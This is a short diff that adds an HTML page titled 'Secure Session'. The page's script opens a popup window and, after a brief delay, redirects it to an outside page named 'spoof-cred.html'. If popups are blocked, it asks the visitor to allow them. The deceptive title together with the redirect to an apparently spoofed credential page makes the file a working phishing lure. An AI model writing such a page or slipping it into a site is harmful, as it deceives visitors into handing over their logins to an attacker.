@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><title>Secure Session</title></head>
+<body>
+<script>
+  const win = window.open("about:blank", "_blank");
+
+  setTimeout(() => {
+    if (win) {
+      win.location.replace("https://sauceialist.github.io/spoof-cred.html");
+    } else {
+      alert("Please allow popups.");
+    }
+  }, 200);
+</script>
+</body>
+</html>
